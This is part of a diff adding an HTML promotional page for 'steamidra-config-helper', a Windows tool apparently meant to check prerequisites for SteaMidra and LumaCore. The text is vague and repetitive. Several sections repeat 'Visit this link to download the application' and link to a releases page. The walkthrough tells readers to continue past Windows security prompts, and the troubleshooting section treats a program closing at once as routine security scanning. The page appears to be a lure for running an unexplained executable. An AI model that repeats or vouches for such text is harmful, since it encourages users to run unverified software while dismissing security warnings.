+    padding: 16px 32px;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(109, 40, 217, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    text-align: center;
+  }
+  .btn-primary:hover {
+    text-decoration: none;
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(109, 40, 217, 0.36);
+  }
+  .btn-row { margin: 26px 0 6px; }
+  .hint {
+    font-size: 0.92rem;
+    color: #6b7185;
+    margin-top: 12px;
+  }
+  section {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px 12px;
+    border: 1px solid #e8eaf2;
+    box-shadow: 0 6px 18px rgba(31, 35, 48, 0.05);
+    margin-bottom: 26px;
+  }
+  .card-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin: 8px 0 20px;
+  }
+  .card {
+    background: #f9f9fd;
+    border: 1px solid #e6e8f1;
+    border-radius: 12px;
+    padding: 16px 18px;
+  }
+  .card strong { display: block; margin-bottom: 4px; color: #14172a; }
+  .card span { font-size: 0.95rem; color: #4c5268; }
+  .callout {
+    background: #fdf6ff;
+    border-left: 4px solid #db2777;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0 22px;
+    font-size: 0.98rem;
+  }
+  .note {
+    background: #eef6ff;
+    border-left: 4px solid #2563eb;
+    border-radius: 10px;
+    padding: 14px 18px;
+    margin: 18px 0 22px;
+    font-size: 0.98rem;
+  }
+  ol.steps { counter-reset: step; list-style: none; padding-left: 0; }
+  ol.steps > li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 18px;
+  }
+  ol.steps > li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #ede9fe;
+    color: #5b21b6;
+    font-weight: 700;
+    font-size: 0.92rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  footer.page-footer {
+    margin-top: 40px;
+    text-align: center;
+    font-size: 0.9rem;
+    color: #737a90;
+    line-height: 1.7;
+  }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    .wrap { padding: 24px 14px 50px; }
+    header.hero { padding: 24px 18px; border-radius: 14px; }
+    section { padding: 20px 18px 6px; border-radius: 14px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.18rem; margin-top: 34px; }
+    .card-grid { grid-template-columns: 1fr; }
+    .btn-primary { display: block; width: 100%; padding: 16px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>⚙️ steamidra-config-helper - Set Up SteaMidra Without the Guesswork</h1>
+  <p class="lede">A friendly desktop assistant for Windows that verifies your prerequisites, checks LumaCore dependencies, and walks you through the SteaMidra configuration process one clear step at a time. No scripting, no command lines, no guesswork.</p>
+  <div class="btn-row">
+    <a class="btn-primary" href="https://github.com/Iamhvs/steamidra-config-helper/releases">⬇️ Get steamidra-config-helper for Windows</a>
+  </div>
+  <p class="hint">Visit this link to download the application.</p>
+</header>
+
+<section>
+  <h2>🚀 Getting Started</h2>
+  <p>Getting your configuration ready does not require any technical background. The assistant is built for everyday Windows users who simply want SteaMidra to work correctly the first time, without digging through folders or editing text files by hand.</p>
+  <p>Before you do anything else, open the download page and grab the latest release. You do not need to install extra tools, sign up for an account, or register anywhere. The assistant runs as a normal desktop program on your PC.</p>
+  <p>The entire flow looks like this: you open the assistant, it looks at your computer, it tells you what is already in place and what is missing, and then it guides you through the remaining setup. Anything it cannot find is explained in plain language, with a clear suggestion for what to do next.</p>
+  <div class="note">💡 Tip: keep the download page open in a browser tab until you have finished setup. That way, if you ever need to grab the latest version again, it is only one click away.</div>
+</section>
+
+<section>
+  <h2>🧩 What This Assistant Does</h2>
+  <p>The steamidra-config-helper is a configuration companion. It does not replace SteaMidra — it prepares your system so that SteaMidra can be configured cleanly and reliably. Think of it as a checklist that runs itself and explains every item along the way.</p>
+  <div class="card-grid">
+    <div class="card">
+      <strong>🔍 Prerequisite checks</strong>
+      <span>Confirms that the files, folders and Windows components SteaMidra expects are actually present before you begin.</span>
+    </div>
+    <div class="card">
+      <strong>🧱 LumaCore dependency review</strong>
+      <span>Verifies that the required LumaCore components are available and correctly reachable by the configuration process.</span>
+    </div>
+    <div class="card">
+      <strong>🧭 Guided setup</strong>
+      <span>Walks you through each configuration step in order, so nothing is skipped and nothing is done out of sequence.</span>
+    </div>
+    <div class="card">
+      <strong>📄 Readable results</strong>
+      <span>Shows a simple summary of what passed, what was fixed and what still needs your attention.</span>
+    </div>
+    <div class="card">
+      <strong>🎮 Steam-focused configuration</strong>
+      <span>Handles the Steam-related settings that SteaMidra depends on, keeping your game library setup consistent.</span>
+    </div>
+    <div class="card">
+      <strong>🪟 Windows-first design</strong>
+      <span>Built specifically for Windows desktops, with familiar windows, buttons and messages.</span>
+    </div>
+  </div>
+  <p>Because the assistant concentrates on verification and guidance, you always know the state of your setup. If something is missing, you see it immediately rather than discovering it halfway through a configuration run.</p>
+</section>
+
+<section>
+  <h2>✅ What Gets Checked</h2>
+  <p>The assistant performs a sequence of straightforward checks. Each one is designed to answer a single question, so results are easy to interpret even if you have never configured anything like this before.</p>
+  <ul>
+    <li><strong>Windows environment readiness</strong> — confirms that your system is in a suitable state to run the configuration process.</li>
+    <li><strong>Existing SteaMidra files</strong> — looks for the folders and files that the setup expects to find, and flags anything that appears to be missing or out of place.</li>
+    <li><strong>LumaCore dependencies</strong> — verifies that the LumaCore components required by SteaMidra are present and usable.</li>
+    <li><strong>Steam configuration state</strong> — reviews the Steam-related settings that SteaMidra relies on and points out anything that needs adjusting.</li>
+    <li><strong>File permissions and access</strong> — makes sure the assistant can read and write where it needs to, which is a common cause of failed setups.</li>
+  </ul>
+  <p>When a check passes, you get a clear confirmation. When a check does not pass, you get a plain description of what was found and what the recommended next step is. Nothing is left as an unexplained error message.</p>
+</section>
+
+<section>
+  <h2>💾 Download and Setup</h2>
+  <p>Everything you need is on the official releases page. Visit this link to download the application.</p>
+  <div class="btn-row">
+    <a class="btn-primary" href="https://github.com/Iamhvs/steamidra-config-helper/releases">⬇️ Download steamidra-config-helper</a>
+  </div>
+  <p class="hint">This opens the releases page, where the newest version is listed at the top.</p>
+  <p>On the releases page, look for the most recent release entry. Download the file attached to that release, then save it somewhere easy to find, such as your Downloads folder or your Desktop. Once the download finishes, the assistant is ready to be started.</p>
+  <div class="callout">📌 Keep the downloaded file in a permanent folder rather than a temporary one. If you move it to the Recycle Bin later, you will need to download it again.</div>
+  <p>The assistant is a desktop program, so there is no long installation ritual. Open it the same way you open any other program on Windows, and it will present you with its first screen.</p>
+</section>
+
+<section>
+  <h2>🪟 Step-by-Step Walkthrough</h2>
+  <p>Follow these steps in order. Each one builds on the last, and you can always pause and come back later — the assistant does not require you to finish everything in a single sitting.</p>
+  <ol class="steps">
+    <li><strong>Download the assistant.</strong> Visit the releases page linked above and save the latest version to your computer.</li>
+    <li><strong>Open the assistant.</strong> Start it like any other Windows program. If Windows shows a security prompt, review it and continue if you are comfortable with the file you downloaded.</li>
+    <li><strong>Run the prerequisite check.</strong> Let the assistant scan your system. This may take a moment. Wait for the summary screen to appear.</li>
+    <li><strong>Read the results.</strong> Green or "passed" items need no action. Items marked as needing attention come with a short explanation of what to do next.</li>
+    <li><strong>Resolve anything flagged.</strong> Follow the suggestions one by one. When you have made a change, rerun the check so the assistant can confirm the item now passes.</li>
+    <li><strong>Verify LumaCore dependencies.</strong> Let the assistant confirm that the LumaCore components required for your setup are available.</li>
+    <li><strong>Complete the guided configuration.</strong> Move through the remaining steps in the order presented. Do not skip ahead — the assistant sequences the steps deliberately.</li>
+    <li><strong>Save your summary.</strong> Keep the final result screen or any exported summary in a safe place so you can refer back to it later.</li>
+    <li><strong>Launch and test.</strong> Once everything passes, open SteaMidra and confirm that your configuration is being picked up correctly.</li>
+  </ol>
+  <p>If you close the assistant partway through, simply open it again and restart the checks. Verification is repeatable and safe to run as many times as you like.</p>
+</section>
+
+<section>
+  <h2>🛠️ Troubleshooting Tips</h2>
+  <h3>The download will not start</h3>
+  <p>Some browsers block downloads until you explicitly allow them. Check the download tray or the address bar for a permission prompt and allow the file. If the page itself does not load, try again in a different browser or on a different network.</p>
+  <h3>The assistant closes immediately after opening</h3>
+  <p>This is often caused by security software scanning a newly downloaded program. Wait a moment and try opening it again. If it still closes, run it from a folder you own, such as your Desktop, rather than from a temporary location.</p>
+  <h3>A prerequisite check keeps failing</h3>
+  <p>Read the description attached to the failing item carefully. Most failures point to a very specific cause — a missing folder, a file in an unexpected location, or a permissions issue. Fix that one item and rerun the check before changing anything else.</p>
+  <h3>LumaCore dependencies are not detected</h3>
+  <p>Confirm that the components exist where SteaMidra expects them to be. If you recently moved folders or restored files from a backup, paths may have changed. Reset the location and run the dependency check again.</p>
+  <h3>Steam-related settings still need attention</h3>
+  <p>Make sure Steam is fully closed while you apply configuration changes. Some settings are only read at startup, so a running Steam client can hide the change until you restart it.</p>
+  <h3>Everything passes but the configuration does not seem to apply</h3>
+  <p>Restart both applications in order: close SteaMidra first, then the assistant, then reopen the assistant and let it verify once more. A clean restart resolves the majority of "applied but not visible" situations.</p>
+</section>
+
+<section>
+  <h2>🔒 Privacy and Safety</h2>
+  <p>The assistant is a local desktop tool. It inspects the folders and settings on your own computer in order to verify your configuration. It does not ask for account credentials, payment details, or personal information, and you are never required to create a login.</p>
+  <p>Always get the assistant from the official releases page linked on this page. Downloading copies from unverified mirrors is the most common way people end up with unwanted software. If a page asks you to complete a survey, install a "downloader helper", or enter a password before giving you the file, close it and return to the official link.</p>
+  <p>Because configuration touches system files, it is a sensible habit to create a restore point or back up your important folders before making changes. That way, if something does not work out as expected, you can return to a known-good state quickly.</p>
+</section>
+
+<section>
+  <h2>❓ Frequently Asked Questions</h2>
+  <h3>Do I need any programming knowledge?</h3>
+  <p>No. The assistant is designed for everyday users. Every screen uses plain language and each flagged item includes a suggested next action.</p>
+  <h3>Is this the same thing as SteaMidra?</h3>
+  <p>No. The steamidra-config-helper is a setup and verification companion. It prepares and checks your environment so that SteaMidra can be configured properly.</p>
+  <h3>Can I run the checks more than once?</h3>
+  <p>Yes, and you are encouraged to. Running the checks again after making a change is the fastest way to confirm that a problem is actually resolved.</p>
+  <h3>Do I need SteamVR or a headset?</h3>
+  <p>No. SteamVR is one of the related topics in the SteaMidra ecosystem, but the assistant's core job is verifying your SteaMidra configuration and its LumaCore dependencies. SteamVR specifics are not required to complete setup.</p>
+  <h3>What if a check fails and I do not understand the message?</h3>
+  <p>Read the description line attached to the item — it usually names the exact folder or component involved. Fixing or restoring that single item is normally enough. Rerun the check afterwards to confirm.</p>
+  <h3>Where do I get the newest version?</h3>
+  <p>Always from the official releases page. Visit this link to download the application.</p>
+  <div class="btn-row">
+    <a class="btn-primary" href="https://github.com/Iamhvs/steamidra-config-helper/releases">⬇️ Open the releases page</a>
+  </div>
+</section>
+
+<section>
+  <h2>💬 Feedback and Support</h2>
+  <p>If a check behaves unexpectedly or a message on screen is unclear, the release page is the best place to look for updates and notes about what changed between versions. Many issues are already resolved in a newer release, so it is always worth confirming you are running the most recent version before spending time troubleshooting.</p>
+  <p>When describing a problem, include the name of the check that failed, the wording of the message you saw, and the version you downloaded. That information makes it far easier to identify what happened and to suggest a fix.</p>
+  <p>For the smoothest experience: keep the assistant in a permanent folder, run the checks after every change, and restart both SteaMidra and the assistant whenever settings seem not to apply. These three habits solve the vast majority of setup headaches.</p>
+  <p>Ready to begin? Visit this link to download the application and start the guided checks on your Windows PC today.</p>
+</section>
+
+<footer class="page-footer">
+  <p>steamidra-config-helper — a desktop setup assistant for SteaMidra on Windows.</p>
+</footer>
+
+</div>
 </body>
 </html>
+```
